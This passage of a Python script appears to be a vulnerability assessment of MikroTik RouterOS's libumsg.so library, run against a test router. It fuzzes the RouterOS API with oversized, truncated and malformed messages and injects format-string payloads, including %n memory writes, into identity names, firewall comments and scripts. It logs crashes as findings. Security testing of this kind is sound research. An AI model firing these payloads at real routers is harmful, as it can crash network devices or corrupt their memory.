        ("claim_64KB_send_16", 65536, 16),
        ("claim_1MB_send_4",   1048576, 4),
        ("claim_16MB_send_8",  16777216, 8),
    ]

    for name, claimed, actual in oversized_words:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=5)
            # Encode the claimed length
            s.send(ros_api_encode_length(claimed))
            # Only send a small amount of data
            s.send(b'X' * actual)
            time.sleep(2)
            try:
                resp = s.recv(4096)
                result_str = f"Got {len(resp)} bytes"
            except socket.timeout:
                result_str = "Timeout"
            except Exception as e:
                result_str = f"Error: {e}"
            s.close()
        except Exception as e:
            result_str = f"Connection error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_oversized_word", f"oversized word: {name}",
            f"Claim {claimed} byte word, send only {actual} bytes",
            f"{result_str}, crashed={crashed}",
            {"claimed_length": claimed, "actual_sent": actual,
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_oversize_{name}")
        time.sleep(0.5)

    # ── 4c: Truncated messages at parse points (3 tests) ────────────────
    truncated_tests = [
        ("mid_login_cmd",     ["/login"], False),     # Send command but no terminator
        ("empty_sentence",    [], True),               # Just a terminator
        ("partial_word",      None, False),            # Half a word
    ]

    for name, words, send_terminator in truncated_tests:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=5)
            if words is None:
                # Send partial word: length prefix says 100 but only 10 bytes
                s.send(ros_api_encode_length(100))
                s.send(b'/login\x00\x00\x00\x00')  # 10 bytes of 100
            else:
                for w in words:
                    ros_api_send_word(s, w)
                if send_terminator:
                    s.send(b'\x00')
            time.sleep(2)
            try:
                resp = s.recv(4096)
                result_str = f"Got {len(resp)} bytes"
            except socket.timeout:
                result_str = "Timeout"
            except Exception as e:
                result_str = f"Error: {e}"
            s.close()
        except Exception as e:
            result_str = f"Connection error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_truncated", f"truncated message: {name}",
            f"Send truncated/malformed API message",
            f"{result_str}, crashed={crashed}",
            {"name": name, "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_trunc_{name}")
        time.sleep(0.3)

    # ── 4d: Invalid API commands (3 tests) ───────────────────────────────
    invalid_cmds = [
        ("nonexistent_cmd",   ["/nonexistent/command/xyz"]),
        ("very_long_cmd",     ["/" + "a" * 10000]),
        ("binary_cmd",        ["\x00\x01\x02\xff\xfe"]),
    ]

    for name, words in invalid_cmds:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=5)
            ros_api_send_sentence(s, words)
            resp = ros_api_read_response(s, timeout=3)
            result_str = f"Response: {truncate(str(resp), 300)}"
            s.close()
        except Exception as e:
            result_str = f"Error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_invalid_cmd", f"invalid command: {name}",
            f"Send invalid API command to port 8728",
            f"{result_str}, crashed={crashed}",
            {"name": name, "command": truncate(str(words), 200),
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_invcmd_{name}")
        time.sleep(0.3)

    # ── 4e: Login with oversized username/password (3 tests) ─────────────
    auth_overflow_tests = [
        ("long_user_1KB",  "A" * 1024,  "admin"),
        ("long_pass_1KB",  "admin",     "B" * 1024),
        ("long_both_64KB", "C" * 65536, "D" * 65536),
    ]

    for name, user, passwd in auth_overflow_tests:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=10)
            ros_api_send_sentence(s, [
                "/login",
                f"=name={user}",
                f"=password={passwd}",
            ])
            resp = ros_api_read_response(s, timeout=5)
            result_str = f"Response: {truncate(str(resp), 300)}"
            s.close()
        except Exception as e:
            result_str = f"Error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_auth_overflow", f"auth overflow: {name}",
            f"Login with oversized credentials via API protocol",
            f"{result_str}, crashed={crashed}",
            {"name": name, "user_len": len(user), "pass_len": len(passwd),
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_auth_{name}")
            ec.add_finding(
                "HIGH",
                f"Router crash via oversized API login ({name})",
                f"Sending {len(user)}-byte username / {len(passwd)}-byte password "
                f"to RouterOS API caused crash.",
                cwe="CWE-120", cvss="8.6",
                evidence_refs=[f"api_auth_{name}"],
            )
        time.sleep(0.5)

    # ── 4f: Binary garbage after valid login (2 tests) ──────────────────
    garbage_tests = [
        ("random_4KB",  os.urandom(4096)),
        ("null_bytes",  b'\x00' * 1024),
    ]

    for name, garbage in garbage_tests:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=10)
            # Login first
            if ros_api_login(s):
                # Send garbage
                s.send(garbage)
                time.sleep(2)
                try:
                    resp = s.recv(4096)
                    result_str = f"Login OK, post-garbage got {len(resp)} bytes"
                except socket.timeout:
                    result_str = "Login OK, post-garbage timeout"
                except Exception as e:
                    result_str = f"Login OK, post-garbage error: {e}"
            else:
                result_str = "Login failed"
            s.close()
        except Exception as e:
            result_str = f"Error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_garbage", f"post-login garbage: {name}",
            f"Send {len(garbage)} bytes of garbage after valid API login",
            f"{result_str}, crashed={crashed}",
            {"name": name, "garbage_size": len(garbage),
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_garbage_{name}")
        time.sleep(0.5)

    # ── 4g: Zero-length words and max-words sentence (3 tests) ──────────
    special_sentence_tests = [
        ("100_zero_words",     [""]*100),
        ("max_words_500",      [f"=key{i}=val{i}" for i in range(500)]),
        ("mixed_empty_data",   ["", "/system/resource", "", "", "=.proplist=", ""]),
    ]

    for name, words in special_sentence_tests:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=10)
            if ros_api_login(s):
                ros_api_send_sentence(s, words)
                resp = ros_api_read_response(s, timeout=3)
                result_str = f"Login OK, response: {truncate(str(resp), 200)}"
            else:
                result_str = "Login failed"
            s.close()
        except Exception as e:
            result_str = f"Error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_special_sentence", f"special sentence: {name}",
            f"Send sentence with {len(words)} words (including empty) to API",
            f"{result_str}, crashed={crashed}",
            {"name": name, "word_count": len(words),
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_special_{name}")
        time.sleep(0.3)

    # ── 4h: Recursive/nested structure attempt (3 tests) ────────────────
    nested_tests = [
        ("deeply_nested_attrs", [
            "/system/resource/print",
            *[f"=.proplist={'a'*i}" for i in range(1, 51)]
        ]),
        ("duplicate_tags", [
            "/login",
            "=name=admin", "=name=admin2", "=name=admin3",
            "=password=admin", "=password=other", "=password=third",
        ]),
        ("tag_format_string", [
            "/system/resource/print",
            "=.proplist=%x%x%x%x",
        ]),
    ]

    for name, words in nested_tests:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=10)
            if name == "duplicate_tags":
                # Don't pre-login for this one
                ros_api_send_sentence(s, words)
            else:
                if ros_api_login(s):
                    ros_api_send_sentence(s, words)
                else:
                    result_str = "Login failed"
                    s.close()
                    continue
            resp = ros_api_read_response(s, timeout=3)
            result_str = f"Response: {truncate(str(resp), 200)}"
            s.close()
        except Exception as e:
            result_str = f"Error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "api_nested", f"nested/recursive: {name}",
            f"Send complex/nested API message structure",
            f"{result_str}, crashed={crashed}",
            {"name": name, "word_count": len(words),
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_nested_{name}")
        time.sleep(0.3)

    log(f"  Section 4 complete")


# =============================================================================
# Section 5: Format String via Logging/Error Paths (~20 tests)
# =============================================================================

def test_format_string_logging():
    """Create objects with format-string names, trigger errors that log
    user-controlled strings, check if log entries show memory values.

    %n tests are performed LAST with extra health monitoring.
    """
    log("=" * 70)
    log("SECTION 5: Format String via Logging/Error Paths")
    log("=" * 70)

    # ── 5a: Create objects with format string names/comments (6 tests) ───
    fmtstr_objects = [
        ("fw_comment_hex",    "POST", "/ip/firewall/filter/add",
         {"chain": "forward", "action": "accept",
          "comment": "%x%x%x%x%x%x%x%x"},
         "firewall_rules"),
        ("fw_comment_ptr",    "POST", "/ip/firewall/filter/add",
         {"chain": "forward", "action": "accept",
          "comment": "%p%p%p%p%p%p%p%p"},
         "firewall_rules"),
        ("script_name_hex",   "POST", "/system/script/add",
         {"name": "_fmt_%x%x%x%x", "source": ":log info test"},
         "scripts"),
        ("script_name_s",     "POST", "/system/script/add",
         {"name": "_fmt_%s%s%s%s%s%s%s%s", "source": ":log info test"},
         "scripts"),
        ("scheduler_hex",     "POST", "/system/scheduler/add",
         {"name": "_fmt_%08x_%08x_%08x_%08x",
          "on-event": ":log info test", "interval": "99d"},
         "schedulers"),
        ("queue_ptr",         "POST", "/queue/simple/add",
         {"name": "_fmt_%p%p%p%p", "target": "0.0.0.0/0"},
         "queues"),
    ]

    for name, method, path, data, cleanup_cat in fmtstr_objects:
        pre = health_check()
        status, resp = rest_request(method, path, data)
        post = health_check()
        crashed = detect_crash(pre, post)

        track_created_object(cleanup_cat, status, resp)

        ec.add_test(
            "fmtstr_create", f"format string object: {name}",
            f"Create object with format specifiers in name/comment",
            f"HTTP {status}, crashed={crashed}",
            {"name": name, "data": {k: repr(v) for k, v in data.items()},
             "status": status, "response": truncate(resp),
             "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"fmtstr_{name}")
            ec.add_finding(
                "CRITICAL",
                f"Format string crash during object creation ({name})",
                f"Creating {name} with format specifiers crashed the router. "
                f"This indicates format string processing in libumsg message path.",
                cwe="CWE-134", cvss="9.8",
                evidence_refs=[f"fmtstr_{name}"],
            )
        time.sleep(0.3)

    # ── 5b: Trigger errors that log format-string names (4 tests) ───────
    error_triggers = [
        ("delete_fmtstr_id",  "DELETE", "/system/script/%x%x%x%x"),
        ("get_fmtstr_path",   "GET",    "/system/script/%p%p%p%p"),
        ("patch_fmtstr_id",   "PATCH",  "/ip/firewall/filter/%08x%08x%08x%08x"),
        ("post_fmtstr_path",  "POST",   "/%s%s%s%s/invalid"),
    ]

    for name, method, path in error_triggers:
        pre = health_check()
        if method in ("DELETE", "GET"):
            status, resp = rest_request(method, path)
        else:
            status, resp = rest_request(method, path, {"test": "value"})
        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "fmtstr_error_trigger", f"error trigger: {name}",
            f"{method} /rest{path} -- trigger error logging with fmt specifiers",
            f"HTTP {status}, crashed={crashed}",
            {"name": name, "method": method, "path": path,
             "status": status, "response": truncate(resp),
             "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"fmtstr_err_{name}")
        time.sleep(0.3)

    # ── 5c: Check logs for format string expansion (2 tests) ─────────────
    log("  Checking router logs for format string expansion...")

    # Look for hex-like patterns that indicate %x/%p expansion
    hex_pattern = re.compile(r'(?<!\w)[0-9a-fA-F]{8}(?!\w)')

    try:
        r = requests.get(f"http://{TARGET}/rest/log",
                         auth=AUTH, timeout=15, verify=False)
        if r.status_code == 200:
            log_entries = r.json()

            # Search for entries related to our format-string objects
            fmt_related = []
            expanded_entries = []

            for entry in log_entries:
                msg = entry.get("message", "")
                # Check if any of our format strings appear literally
                if any(fs in msg for fs in ["%x", "%p", "%s", "%n", "%08x"]):
                    fmt_related.append(entry)
                # Check if hex values appear (possible expansion)
                hex_matches = hex_pattern.findall(msg)
                if hex_matches and "_fmt_" in msg:
                    expanded_entries.append({
                        "entry": entry,
                        "hex_matches": hex_matches[:10],
                    })

            ec.add_test(
                "fmtstr_log_analysis", "log analysis: literal format strings",
                "Check if format specifiers appear literally in router logs",
                f"Found {len(fmt_related)} entries with literal format specifiers",
                {"literal_fmtstr_count": len(fmt_related),
                 "sample_entries": [truncate(str(e), 200) for e in fmt_related[:5]]},
                anomaly=False,
            )

            fmt_expanded = len(expanded_entries) > 0
            ec.add_test(
                "fmtstr_log_analysis", "log analysis: format string expansion",
                "Check if format specifiers were expanded to hex values in logs",
                f"Found {len(expanded_entries)} entries with possible hex expansion",
                {"expanded_count": len(expanded_entries),
                 "expanded_entries": [truncate(str(e), 200) for e in expanded_entries[:5]]},
                anomaly=fmt_expanded,
            )

            if fmt_expanded:
                ec.add_finding(
                    "HIGH",
                    "Format string expansion detected in router logs",
                    f"Objects with format specifiers in names/comments caused "
                    f"expanded hex values in log entries, confirming format "
                    f"string processing in libumsg/logging path.",
                    cwe="CWE-134",
                    evidence_refs=["fmtstr_log_expansion"],
                )
        else:
            ec.add_test(
                "fmtstr_log_analysis", "log analysis: access",
                "Attempt to pull router logs for format string analysis",
                f"HTTP {r.status_code} -- could not read logs",
                anomaly=False,
            )
    except Exception as e:
        ec.add_test(
            "fmtstr_log_analysis", "log analysis: access",
            "Pull router logs",
            f"Error: {e}",
            anomaly=False,
        )

    # ── 5d: Format string in identity name (4 tests) ────────────────────
    # These are tested in order from safe to dangerous
    identity_fmtstr = [
        ("identity_hex",       "%x%x%x%x%x%x%x%x",     False),
        ("identity_ptr",       "%p%p%p%p%p%p%p%p",       False),
        ("identity_str",       "%s%s%s%s",               False),
        # %n is LAST and most dangerous -- may write to memory
        ("identity_write_n",   "%n%n%n%n",               True),
    ]

    for name, payload, is_dangerous in identity_fmtstr:
        if is_dangerous and CRASH_DETECTED:
            ec.add_test(
                "fmtstr_identity", f"identity fmtstr: {name}",
                f"Set identity to {payload} (SKIPPED -- prior crash)",
                "SKIPPED",
                {"reason": "Prior crash detected, skipping %n"},
            )
            continue

        pre = health_check()

        if is_dangerous:
            log(f"  WARNING: Setting identity to {payload} -- may crash router")
            pull_logs_before_destructive_action(f"fmtstr_{name}")

        status, resp = rest_request("POST", "/system/identity/set",
                                    {"name": payload})
        time.sleep(0.5 if not is_dangerous else 2)

        post = health_check()
        crashed = detect_crash(pre, post)

        # Read back to check if format string was processed
        readback = None
        if not crashed and status in (200, 201):
            rs, rr = rest_request("GET", "/system/identity")
            if rs == 200 and isinstance(rr, dict):
                readback = rr.get("name", "")

        processed = False
        if readback and readback != payload:
            # The format specifiers were processed (not stored literally)
            processed = True

        ec.add_test(
            "fmtstr_identity", f"identity fmtstr: {name}",
            f"Set system identity to format string: {payload}",
            f"HTTP {status}, crashed={crashed}, readback={repr(readback)}, processed={processed}",
            {"payload": payload, "status": status, "response": truncate(resp),
             "crashed": crashed, "readback": readback, "processed": processed,
             "pre_uptime": pre.get("uptime"), "post_uptime": post.get("uptime")},
            anomaly=crashed or processed,
        )

        if crashed:
            handle_crash(f"identity_{name}")
            ec.add_finding(
                "CRITICAL",
                f"Router crash via format string in identity ({name})",
                f"Setting system identity to {payload} crashed the router. "
                f"libumsg processes identity strings through sprintf without "
                f"sanitizing format specifiers.",
                cwe="CWE-134", cvss="9.8",
                evidence_refs=[f"identity_{name}"],
                reproduction_steps=[
                    f"1. POST /rest/system/identity/set with name={payload}",
                    "2. Router crashes/reboots",
                    "3. Confirm via uptime reset",
                ],
            )

        if processed:
            ec.add_finding(
                "HIGH",
                f"Format string processed in identity name ({name})",
                f"Identity set to {repr(payload)} but read back as {repr(readback)}. "
                f"Format specifiers were interpreted, not stored literally.",
                cwe="CWE-134",
                evidence_refs=[f"identity_{name}"],
            )

        time.sleep(0.3)

    # Restore identity
    rest_request("POST", "/system/identity/set", {"name": "MikroTik"})

    # ── 5e: Format string via API protocol (4 tests) ────────────────────
    api_fmtstr_tests = [
        ("api_cmd_hex",    ["/system/identity/set", "=name=%x%x%x%x"]),
        ("api_cmd_ptr",    ["/system/identity/set", "=name=%p%p%p%p"]),
        ("api_comment_hex",["/ip/firewall/filter/add",
                            "=chain=forward", "=action=accept",
                            "=comment=%08x.%08x.%08x.%08x"]),
        ("api_script_hex", ["/system/script/add",
                            "=name=_apifmt_%x%x",
                            "=source=:log info test"]),
    ]

    for name, words in api_fmtstr_tests:
        pre = health_check()
        result_str = ""
        try:
            s = ros_api_connect(timeout=10)
            if ros_api_login(s):
                ros_api_send_sentence(s, words)
                resp = ros_api_read_response(s, timeout=5)
                result_str = f"Response: {truncate(str(resp), 300)}"

                # Track created objects for cleanup
                for w in resp:
                    if w.startswith("=ret="):
                        oid = w.split("=ret=")[1]
                        if "firewall" in str(words):
                            CLEANUP["firewall_rules"].append(oid)
                        elif "script" in str(words):
                            CLEANUP["scripts"].append(oid)
            else:
                result_str = "Login failed"
            s.close()
        except Exception as e:
            result_str = f"Error: {e}"

        post = health_check()
        crashed = detect_crash(pre, post)

        ec.add_test(
            "fmtstr_api", f"API format string: {name}",
            f"Send format specifiers via RouterOS API protocol",
            f"{result_str}, crashed={crashed}",
            {"name": name, "words": [truncate(w, 100) for w in words],
             "result": result_str, "crashed": crashed},
            anomaly=crashed,
        )

        if crashed:
            handle_crash(f"api_fmtstr_{name}")
        time.sleep(0.3)

    # Restore identity via REST
    rest_request("POST", "/system/identity/set", {"name": "MikroTik"})

    log(f"  Section 5 complete")


# =============================================================================
# Main
# =============================================================================

def main():
    log("=" * 70)
    log("MikroTik RouterOS CHR 7.20.8 -- libumsg.so Indirect Attack Assessment")
    log(f"Target: {TARGET} (pristine instance)")
    log(f"Auth: {ADMIN_USER}/{ADMIN_PASS}")
    log(f"Evidence: {EVIDENCE_DIR / 'attack_libumsg_indirect.json'}")
    log("=" * 70)
    log("")
    log("Attack surface: libumsg.so imports execve, sprintf, strcpy, realpath")
    log("Strategy: indirect attack through REST API and RouterOS API protocol")
    log("")

    # ── Pre-flight checks ───────────────────────────────────────────────
    log("Pre-flight: checking router connectivity...")
    status = health_check()
    if not status.get("alive"):
        log(f"FATAL: Router at {TARGET} is not responding. Aborting.")
        sys.exit(1)
    log(f"  Router alive: version={status.get('version')}, "
        f"uptime={status.get('uptime')}, "
        f"cpu={status.get('cpu_load')}, "
        f"mem={status.get('free_memory')}")

    initial_uptime = status.get("uptime")
    ec.results["metadata"]["target"] = TARGET
    ec.results["metadata"]["initial_uptime"] = initial_uptime
    ec.results["metadata"]["library_info"] = {
        "name": "libumsg.so",
        "dangerous_imports": ["execve", "sprintf", "strcpy", "realpath"],
        "role": "IPC backbone for ALL RouterOS services",
        "attack_strategy": "Indirect via REST API and RouterOS API protocol",
    }

    # Record original identity to restore later
    orig_status, orig_identity = rest_request("GET", "/system/identity")
    original_name = "MikroTik"
    if orig_status == 200 and isinstance(orig_identity, dict):
        original_name = orig_identity.get("name", "MikroTik")

    # ── Run all test sections ─────────────────────────────────────────
    try:
        test_command_execution_paths()     # ~25 tests (Section 1)
        test_sprintf_overflow()            # ~25 tests (Section 2)
        test_path_resolution()             # ~25 tests (Section 3)
        test_api_protocol_fuzzing()        # ~25 tests (Section 4)
        test_format_string_logging()       # ~20 tests (Section 5)

    except KeyboardInterrupt:
        log("\nInterrupted by user. Saving partial results...")
    except Exception as e:
        log(f"\nUnexpected error: {e}")
        import traceback
        traceback.print_exc()

    # ── Post-test cleanup ────────────────────────────────────────────────
    log("")
    log("=" * 70)
    log("POST-TEST CLEANUP")
    log("=" * 70)

    cleanup_created_objects()

    # Restore identity
    rest_request("POST", "/system/identity/set", {"name": original_name})

    # ── Global crash summary ─────────────────────────────────────────────
    ec.results["metadata"]["crash_count"] = CRASH_COUNT
    ec.results["metadata"]["crash_detected"] = CRASH_DETECTED

    # ── Pull final router logs ───────────────────────────────────────────
    log("\nPulling final router logs...")
    final_log_matches = pull_logs_and_search([
        "error", "critical", "crash", "panic", "segfault",
        "buffer", "overflow", "denied", "format",
        "%x", "%p", "%s", "%n", "AAAA",
    ])
    ec.results["metadata"]["final_log_matches"] = len(final_log_matches)
    ec.results["metadata"]["final_log_sample"] = [
        truncate(str(e), 200) for e in final_log_matches[:20]
    ]

    # ── Summary ──────────────────────────────────────────────────────────
    log("")
    log("=" * 70)
    log("ASSESSMENT SUMMARY")
    log("=" * 70)

    total = ec.results["metadata"]["total_tests"]
    anomalies = ec.results["metadata"]["anomalies"]
    findings = len(ec.results["findings"])
    final_health = health_check()

    log(f"  Total tests:        {total}")
    log(f"  Anomalies:          {anomalies}")
    log(f"  Findings:           {findings}")
    log(f"  Crashes:            {CRASH_COUNT}")
    log(f"  Initial uptime:     {initial_uptime}")
    log(f"  Final uptime:       {final_health.get('uptime')}")
    log(f"  Final log matches:  {len(final_log_matches)}")

    # Breakdown by category
    categories = {}
    for t in ec.results["tests"]:
        cat = t.get("category", "unknown")
        categories.setdefault(cat, {"total": 0, "anomalies": 0})
        categories[cat]["total"] += 1
        if t.get("anomaly"):
            categories[cat]["anomalies"] += 1

    log("")
    log("  Results by category:")
    for cat, stats in sorted(categories.items()):
        log(f"    {cat}: {stats['total']} tests, {stats['anomalies']} anomalies")

    if findings > 0:
        log("")
        log("  Findings:")
        for f in ec.results["findings"]:
            log(f"    [{f['severity']}] {f['title']}")

    # ── Save evidence ────────────────────────────────────────────────────
    ec.save("attack_libumsg_indirect.json")
    ec.summary()


if __name__ == "__main__":
    main()
